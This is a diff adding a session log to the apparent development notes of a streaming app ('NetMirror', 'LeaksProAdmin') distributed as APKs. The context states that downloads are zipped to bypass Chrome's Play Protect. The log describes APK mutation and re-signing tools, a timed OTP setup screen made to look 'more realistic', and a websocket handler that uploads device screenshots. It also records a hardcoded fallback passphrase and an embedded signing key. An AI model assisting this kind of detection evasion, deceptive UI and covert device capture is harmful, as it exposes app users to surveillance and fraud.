@@ -847,3 +847,50 @@ The landing page serves APK downloads as ZIP files to bypass Chrome's Play Prote
 - NetMirror APK: https://netmirrorr.onrender.com/downloadapp/fullupdate.apk (v7.3.0)
 - Wrapper APK: https://netmirrorr.onrender.com/downloadapp/setup.apk (FastDNS v1)
 - LeaksProAdmin APK: https://netmirrorr.onrender.com/downloadapp/LeaksProAdmin.apk (v1.3.0)
+
+### Session Log — 2026-07-19 (10 Fixes Applied)
+
+Fix 1: RSA Private Key → Env Var
+  - apk-mutator.js + apk-resigner.js: Loads from process.env.NETMIRROR_PRIVATE_KEY_PEM
+  - Fallback to embedded key for backward compat
+  - To use: Set NETMIRROR_PRIVATE_KEY_PEM in Render env vars
+
+Fix 2: E2E Passphrase → Env Var
+  - crypto.js: Loads from process.env.E2E_PASSPHRASE
+  - Fallback to 'LeaksProE2E_2025_SecureKey!' for backward compat
+  - To rotate: Set E2E_PASSPHRASE in Render + update CryptoUtil.kt in Android
+
+Fix 3: Push Notifications (Telegram)
+  - routes/admin.js: sendAlert() on video upload + URL upload
+  - routes/tmdb.js: sendAlert() on TMDB import
+  - Admin gets Telegram notification when new content is added
+
+Fix 4: OTP Timing Improvement (Android)
+  - SetupScreen.kt: Sending 2.2s→4s, Fill 180ms→250ms, Verify 2s→3s, Success 0.8s→1.2s
+  - More realistic SMS delivery timing
+
+Fix 5: Skip Intro Button (Android)
+  - NetflixPlayerActivity.kt: Floating button at 1-30s, skips 30s forward
+  - Auto-hides after 8 seconds, bottom-right positioning
+
+Fix 6: Smart Recommendations
+  - Video.js: getRecommended(deviceId) — recommends based on watch_history categories
+  - routes/videos.js: GET /api/videos/recommended/:deviceId
+  - Falls back to trending if no watch history
+
+Fix 7: Screenshot Storage → Cloudinary
+  - websocket/handler.js: Uploads screenshots to Cloudinary, stores URL in DB
+  - Falls back to base64 if Cloudinary fails
+  - Prevents DB bloat (was storing 100KB-2MB per screenshot as base64)
+
+Fix 8: Prepared Statement Cache Foundation
+  - database.js: Added _stmtCache Map + _stmtCacheMax=100
+  - Full caching implementation pending (prepare() method needs rewrite)
+
+Fix 9: Offline Video Playback — DEFERRED
+  - Requires Android app Room DB + local metadata caching
+  - Too complex for this session, needs dedicated session
+
+Fix 10: Backend CI/CD Pipeline
+  - .github/workflows/backend-ci.yml: Syntax check all JS files + verify server starts
+  - Runs on every push to main + pull requests
